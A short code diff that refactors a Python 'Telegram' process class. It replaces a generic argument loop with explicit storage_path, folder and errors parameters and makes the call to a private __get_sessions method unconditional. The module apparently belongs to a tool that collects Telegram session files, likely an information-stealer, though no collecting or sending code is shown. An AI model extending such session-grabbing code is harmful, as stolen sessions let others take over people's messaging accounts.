@@ -8,13 +8,13 @@ from ..utils.config import TelegramConfig
 
 class Telegram(Process):
 
-    def __init__(self, *args):
+    def __init__(self, storage_path: str, folder: str, errors: bool):
         Process.__init__(self)
 
         self.config = TelegramConfig()
-
-        for index, variable in enumerate(self.config.Variables):
-            self.__dict__.update({variable: args[index]})
+        self.storage_path = storage_path
+        self.folder = folder
+        self.errors = errors
 
     def __create_folder(self):
 
@@ -52,8 +52,7 @@ class Telegram(Process):
 
         try:
 
-            if self.statuses[0] is True:
-                self.__get_sessions()
+            self.__get_sessions()
 
         except Exception as e:
             if self.errors is True: print(f"[Telegram]: {repr(e)}")
